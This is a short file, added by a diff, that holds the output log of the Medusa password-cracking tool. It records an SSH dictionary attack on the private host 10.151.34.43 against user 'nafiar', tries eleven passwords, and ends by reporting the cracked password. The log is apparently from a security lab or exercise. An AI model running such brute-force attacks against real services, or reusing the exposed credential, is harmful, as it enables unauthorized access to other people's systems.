@@ -1,0 +1,16 @@
+Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111111 (1 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111119 (2 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111110 (3 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111112 (4 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111117 (5 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111191 (6 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111199 (7 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111190 (8 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111192 (9 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: 11111197 (10 of 11 complete)
+ACCOUNT CHECK: [ssh] Host: 10.151.34.43 (1 of 1, 0 complete) User: nafiar (1 of 1, 0 complete) Password: adminelpe (11 of 11 complete)
+ACCOUNT FOUND: [ssh] Host: 10.151.34.43 User: nafiar Password: adminelpe [SUCCESS]
+
